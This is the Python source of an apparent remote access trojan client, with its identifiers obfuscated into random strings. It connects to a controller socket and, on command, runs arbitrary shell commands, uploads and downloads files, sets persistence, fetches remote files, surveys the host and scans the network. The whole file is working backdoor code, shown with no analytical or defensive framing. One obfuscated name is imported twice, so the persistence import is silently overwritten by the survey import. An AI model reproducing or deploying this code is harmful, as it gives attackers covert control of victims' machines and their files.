#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import subprocess
import struct
import sys
try:
    from core.crypto import YRziRmEPPXlBbFMWPzvDXHZlVuNCrPBT, SKKkrmGLAJRDTUbwjJLaYtKBVMQbZzJS, jkwBfxODkQDCazFRAKanySiAKxsUUphC
    from core.filesock import WyerSerlsTFVDKVjjvmFBBWFhDZeEwrB, mlagwFzeYdHITweNNECIpONaDpUVkCnW
    from core.persistence import yMwanrVcSyabPBnwbJTWfwiTHZQnTJpc
    from core.scan import bnYBVBXtYNWAwgwJXXByMCeEcgcqHeve
    from core.survey import yMwanrVcSyabPBnwbJTWfwiTHZQnTJpc
    from core.toolkit import PxLarNPvrlTeRhjeFpMkbnGFraeCPfiQ, ilIYRIhpPBvFVGhxFfVhANtrRkIfdoWp
except ImportError as QOLDDPukOCfjUmrGdVkvgkjFXUepMxdI:
    print(QOLDDPukOCfjUmrGdVkvgkjFXUepMxdI)
    sys.exit(0)
OBsOcAuMOznWNokscgcqAxGvqYMlEnfD = sys.platform
qboWSWkKwodNoWSOcqqzVvMonjEecFOc      = 'localhost'
ebpPhybtxRvPsNWWnaTjlHTVUebRHFdI      = 1337
iwzlVGUCpvcblcdfDUsxWbvDJsgQRlnf    = 'b14ce95fa4c33ac2803782d18341869f'
def ZLZjkMMjJUruesRTbCgUukFNoGkpAZiX():
    rknKsknmzbgZguxvPWfDZEbmXwXYtPjR = socket.socket()
    rknKsknmzbgZguxvPWfDZEbmXwXYtPjR.connect((qboWSWkKwodNoWSOcqqzVvMonjEecFOc, ebpPhybtxRvPsNWWnaTjlHTVUebRHFdI))
    GXiCQUHtkzjUHzLgUbEMbFCKAYmtgSPC = jkwBfxODkQDCazFRAKanySiAKxsUUphC(rknKsknmzbgZguxvPWfDZEbmXwXYtPjR)
    while True:
        JrfQMgvdwMLNwxVdYHCRDryhoRHYdPPk = rknKsknmzbgZguxvPWfDZEbmXwXYtPjR.recv(1024)
        JrfQMgvdwMLNwxVdYHCRDryhoRHYdPPk = YRziRmEPPXlBbFMWPzvDXHZlVuNCrPBT(JrfQMgvdwMLNwxVdYHCRDryhoRHYdPPk, GXiCQUHtkzjUHzLgUbEMbFCKAYmtgSPC)
        sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky, _, action = JrfQMgvdwMLNwxVdYHCRDryhoRHYdPPk.partition(' ')
        if sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky == 'quit':
            rknKsknmzbgZguxvPWfDZEbmXwXYtPjR.close()
            sys.exit(0)
        elif sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky == 'run':
            vtVjGtMSPJDGFyiDhiJsPfepeXGtLFKX = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            vtVjGtMSPJDGFyiDhiJsPfepeXGtLFKX = vtVjGtMSPJDGFyiDhiJsPfepeXGtLFKX.stdout.read() + vtVjGtMSPJDGFyiDhiJsPfepeXGtLFKX.stderr.read()
            rknKsknmzbgZguxvPWfDZEbmXwXYtPjR.sendall(SKKkrmGLAJRDTUbwjJLaYtKBVMQbZzJS(vtVjGtMSPJDGFyiDhiJsPfepeXGtLFKX, GXiCQUHtkzjUHzLgUbEMbFCKAYmtgSPC))
        elif sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky == 'download':
            for GyWbGsWEWOwmEgmmYXUCzOJvgAWqrOlb in action.split():
                GyWbGsWEWOwmEgmmYXUCzOJvgAWqrOlb = GyWbGsWEWOwmEgmmYXUCzOJvgAWqrOlb.strip()
                mlagwFzeYdHITweNNECIpONaDpUVkCnW(rknKsknmzbgZguxvPWfDZEbmXwXYtPjR, GyWbGsWEWOwmEgmmYXUCzOJvgAWqrOlb, GXiCQUHtkzjUHzLgUbEMbFCKAYmtgSPC)
        elif sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky == 'upload':
            for GyWbGsWEWOwmEgmmYXUCzOJvgAWqrOlb in action.split():
                GyWbGsWEWOwmEgmmYXUCzOJvgAWqrOlb = GyWbGsWEWOwmEgmmYXUCzOJvgAWqrOlb.strip()
                WyerSerlsTFVDKVjjvmFBBWFhDZeEwrB(rknKsknmzbgZguxvPWfDZEbmXwXYtPjR, GyWbGsWEWOwmEgmmYXUCzOJvgAWqrOlb, GXiCQUHtkzjUHzLgUbEMbFCKAYmtgSPC)
        elif sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky == 'rekey':
            GXiCQUHtkzjUHzLgUbEMbFCKAYmtgSPC = jkwBfxODkQDCazFRAKanySiAKxsUUphC(rknKsknmzbgZguxvPWfDZEbmXwXYtPjR)
        elif sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky == 'persistence':
            vtVjGtMSPJDGFyiDhiJsPfepeXGtLFKX = yMwanrVcSyabPBnwbJTWfwiTHZQnTJpc(OBsOcAuMOznWNokscgcqAxGvqYMlEnfD)
            rknKsknmzbgZguxvPWfDZEbmXwXYtPjR.send(SKKkrmGLAJRDTUbwjJLaYtKBVMQbZzJS(vtVjGtMSPJDGFyiDhiJsPfepeXGtLFKX, GXiCQUHtkzjUHzLgUbEMbFCKAYmtgSPC))
        elif sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky == 'wget':
            vtVjGtMSPJDGFyiDhiJsPfepeXGtLFKX = PxLarNPvrlTeRhjeFpMkbnGFraeCPfiQ(action)
            rknKsknmzbgZguxvPWfDZEbmXwXYtPjR.send(SKKkrmGLAJRDTUbwjJLaYtKBVMQbZzJS(vtVjGtMSPJDGFyiDhiJsPfepeXGtLFKX, GXiCQUHtkzjUHzLgUbEMbFCKAYmtgSPC))
        elif sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky == 'unzip':
            vtVjGtMSPJDGFyiDhiJsPfepeXGtLFKX = ilIYRIhpPBvFVGhxFfVhANtrRkIfdoWp(action)
            rknKsknmzbgZguxvPWfDZEbmXwXYtPjR.send(SKKkrmGLAJRDTUbwjJLaYtKBVMQbZzJS(vtVjGtMSPJDGFyiDhiJsPfepeXGtLFKX, GXiCQUHtkzjUHzLgUbEMbFCKAYmtgSPC))
        elif sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky == 'survey':
            vtVjGtMSPJDGFyiDhiJsPfepeXGtLFKX = yMwanrVcSyabPBnwbJTWfwiTHZQnTJpc(OBsOcAuMOznWNokscgcqAxGvqYMlEnfD)
            rknKsknmzbgZguxvPWfDZEbmXwXYtPjR.send(SKKkrmGLAJRDTUbwjJLaYtKBVMQbZzJS(vtVjGtMSPJDGFyiDhiJsPfepeXGtLFKX, GXiCQUHtkzjUHzLgUbEMbFCKAYmtgSPC))
        elif sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky == 'scan':
            vtVjGtMSPJDGFyiDhiJsPfepeXGtLFKX = bnYBVBXtYNWAwgwJXXByMCeEcgcqHeve(action)
            rknKsknmzbgZguxvPWfDZEbmXwXYtPjR.send(SKKkrmGLAJRDTUbwjJLaYtKBVMQbZzJS(vtVjGtMSPJDGFyiDhiJsPfepeXGtLFKX, GXiCQUHtkzjUHzLgUbEMbFCKAYmtgSPC))
if __name__ == '__main__':
    ZLZjkMMjJUruesRTbCgUukFNoGkpAZiX()
